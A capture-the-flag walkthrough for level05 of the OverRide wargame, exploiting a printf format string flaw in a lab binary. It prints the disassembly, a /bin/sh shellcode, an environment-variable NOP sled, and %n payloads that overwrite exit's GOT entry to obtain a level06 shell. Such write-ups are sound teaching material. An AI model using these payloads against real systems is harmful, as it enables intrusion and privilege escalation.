# Walkthrough

After I logged in as `level05` user, I discovered a binary file named `"level05"`. Upon running it, it requested input. I attempted to input some text and noticed that it converted any uppercase letters to lowercase.

```
level05@OverRide:~$ ./level05
AAAAbbbb1234
aaaabbbb1234
```

To better comprehend the program's behavior, I used `gdb` to debug it. Within the `main` function, the input is read using the `fgets` function and stored in a buffer.

```s
   0x0804845d <+25>: mov    eax,ds:0x80497f0
   0x08048462 <+30>: mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>: mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>: lea    eax,[esp+0x28]
   0x08048472 <+46>: mov    DWORD PTR [esp],eax
   0x08048475 <+49>: call   0x8048350 <fgets@plt>
```

The main function then calculates the length of the previous buffer and iterates through each character in the buffer. If a character is uppercase, it is transformed to lowercase using the `XOR` operator.

```s
   0x08048487 <+67>: lea    eax,[esp+0x28]
   0x0804848b <+71>: add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>: movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>: cmp    al,0x40
   0x08048497 <+83>: jle    0x80484cb <main+135>
   0x08048499 <+85>: lea    eax,[esp+0x28]
   0x0804849d <+89>: add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>: movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>: cmp    al,0x5a
   0x080484a9 <+101>: jg     0x80484cb <main+135>
   0x080484ab <+103>: lea    eax,[esp+0x28]
   0x080484af <+107>: add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>: movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>: mov    edx,eax
   0x080484bb <+119>: xor    edx,0x20
   0x080484be <+122>: lea    eax,[esp+0x28]
   0x080484c2 <+126>: add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>: mov    BYTE PTR [eax],dl
   0x080484cb <+135>: add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>: mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>: lea    eax,[esp+0x28]
   0x080484de <+154>: mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>: mov    edx,eax
   0x080484e8 <+164>: mov    eax,0x0
   0x080484ed <+169>: mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>: mov    edi,edx
   0x080484f3 <+175>: repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>: mov    eax,ecx
   0x080484f7 <+179>: not    eax
   0x080484f9 <+181>: sub    eax,0x1
   0x080484fc <+184>: cmp    ebx,eax
   0x080484fe <+186>: jb     0x8048487 <main+67>
```

The modified buffer is then passed as an argument to the `printf` function to display it, after which the program `exits`.

```s
   0x08048500 <+188>: lea    eax,[esp+0x28]
   0x08048504 <+192>: mov    DWORD PTR [esp],eax
   0x08048507 <+195>: call   0x8048340 <printf@plt>
   0x0804850c <+200>: mov    DWORD PTR [esp],0x0
   0x08048513 <+207>: call   0x8048370 <exit@plt>
```

Upon analyzing the code, it seems that there is a vulnerability in the `printf()` function known as a `format string` vulnerability. This type of vulnerability allows me to provide a format string that contains conversion specifications which enable me to reference memory locations that I am not authorized to access. By using certain conversion specifications like `%x`, `%p`, or `%n`, I can potentially read or write data from arbitrary memory locations.

In this particular case, the format string vulnerability allows me to overwrite the address of the `exit` function in the Global Offset Table `(GOT)`.

The objective is to input a shellcode and modify the `exit` function's address to point to the shellcode's address. However, a problem arises when inputting the shellcode, as the program modifies some of its bytes due to a condition that checks if a character is uppercase.

```
level05@OverRide:~$ python2 -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/shellcode
------------------------------------------------------------------------------------------------------------------------------------------------
(gdb) r < /tmp/shellcode
Starting program: /home/users/level05/level05 < /tmp/shellcode

(gdb) x/16wx 0xffffd518
0xffffd518: 0x99780b6a 0x2f2f6872 0x2f686873 0x896e6962
0xffffd528: 0xcdc931e3 0x00000a80 0xffffd75c 0x0000002f
```

It is noticeable that at the address `0xffffd51a`, the byte 58 has been modified to 78, and at the address `0xffffd51c`, the byte 52 has been changed to 72.

One possible solution that came to mind was to input the shellcode by storing it in the environment variables instead of passing it directly as input to the program.

```
level05@OverRide:~$ export CODE=`python2 -c 'print("\x90" * 300 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'`
```

At this point, all that's left to do is to determine the address of the `"CODE"` variable added to the environment and modify the `exit` address to point to the address of the `"CODE"` variable.

```s
(gdb) p (char *) (getenv("CODE"))
$3 = 0xffffde65
(gdb) x/40wx 0xffffde65
0xffffde65: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffde75: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffde85: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffde95: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffdea5: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffdeb5: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffdec5: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffded5: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffdee5: 0x90909090 0x90909090 0x90909090 0x90909090
0xffffdef5: 0x90909090 0x90909090 0x90909090 0x90909090
```

Subsequently, I planned to modify the address of the `exit` function in the Global Offset Table `(GOT)` with the address `0xffffdf00`, which I had randomly selected from the middle of the `NOP` instructions.

Initially, I used the `x` conversion specifier to display the values in hexadecimal format. Subsequently, the resulting output appeared as follows:

```sh
level05@OverRide:~$ python2 -c 'print("aaaa"  + " %x " * 12)' > /tmp/flag
level05@OverRide:~$ cat /tmp/flag | ./level05
aaaa 64  f7fcfac0  f7ec3af9  ffffd69f  ffffd69e  0  ffffffff  ffffd724  f7fdb000  61616161  20782520  20782520
```

In this example, the `printf` function printed a memory address followed by the value `61616161`, which represents the ASCII characters `"aaaa"`. Based on this observation, I decided to pass the memory address of the `exit` function instead of the `aaaa` string.


```s
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>: jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>: push   0x18
   0x0804837b <+11>: jmp    0x8048330
End of assembler dump.
```

To accomplish this, I utilized `Python` to generate the required strings:

```sh
level05@OverRide:~$ python2 -c 'print("\x08\x04\x97\xe0"[::-1]  + " %x " * 10)' > /tmp/flag
level05@OverRide:~$ cat /tmp/flag | ./level05
 64  f7fcfac0  f7ec3af9  ffffd69f  ffffd69e  0  ffffffff  ffffd724  f7fdb000  80497e0
```

As we know, the `%n` conversion specifier can modify the value of the memory address passed to it. Therefore, I decided to replace the last %x conversion specifier with `%n` in the printf function call.

before using the `%n` conversion:

```s
(gdb) r < /tmp/flag
The program being debugged has been started already.
Starting program: /home/users/level05/level05 < /tmp/flag
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

after using the `%n` conversion:

```s
(gdb) r < /tmp/flag
The program being debugged has been started already.
Starting program: /home/users/level05/level05 < /tmp/flag
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:	0x00000038
```

At this stage, all that is required is to calculate the offset needed to change the value to `0xffffdf00`

```
>>> 0xffffdf00 + 8 - 0x38
4294958800
----------------------------------------------------------------------------------------
level05@OverRide:~$ python2 -c 'print("\x08\x04\x97\xe0"[::-1]  + "%x" * 8 + "%4294958800x%n")' > /tmp/flag
----------------------------------------------------------------------------------------
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

It was observed that nothing happened when attempting to modify the value to `0xffffdf00`. This occurred because the number provided for conversion in the `printf` function exceeded the maximum integer value. To resolve this, I decided to split the value into two parts (`0xffff` and `0xdf00`) and pass them to the addresses of `exit` (`0x80497e0` and `0x80497e2`).

```
level05@OverRide:~$ python2 -c 'print("\x08\x04\x97\xe0"[::-1] + "BBBB" + "\x08\x04\x97\xe2"[::-1] + "%x" * 8 + "%x%n" + "%x%n")' > /tmp/flag
---------------------------------------------------------------------------------
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:	0x00480040
```

At this point, the only task remaining is to calculate the offset for each conversion.

```sh
level05@OverRide:~$ python2 -c 'print("\x08\x04\x97\xe0"[::-1] + "BBBB" + "\x08\x04\x97\xe2"[::-1] + "%x" * 8 + "%x")' > /tmp/flag
level05@OverRide:~$ cat /tmp/flag | ./level05
bbbb64f7fcfac0f7ec3af9ffffd69fffffd69e0ffffffffffffd724f7fdb000 // 63
---------------------------------------------------------------------------------------------------------------
level05@OverRide:~$ python2
Python 2.7.3 (default, Jun 22 2015, 19:33:41)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xdf00 - 63
57025
>>> 0xffff - 0xdf00
8447
level05@OverRide:~$ python2 -c 'print("\x08\x04\x97\xe0"[::-1] + "BBBB" + "\x08\x04\x97\xe2"[::-1] + "%x" * 8 + "%57025x%n" + "%8447x%n")' > /tmp/flag
level05@OverRide:~$ cat /tmp/flag - | ./level05 > /dev/null
whoami 1>&2
level06
cd ../level06
ls -la 1>&2
total 17
dr-xr-x---+ 1 level06 level06   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level06 level06  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level06 level06 3533 Sep 10  2016 .bashrc
-rw-r--r--+ 1 level06 level06   41 Oct 19  2016 .pass
-rw-r--r--  1 level06 level06  675 Sep 10  2016 .profile
-rwsr-s---+ 1 level07 users   7907 Sep 10  2016 level06
```
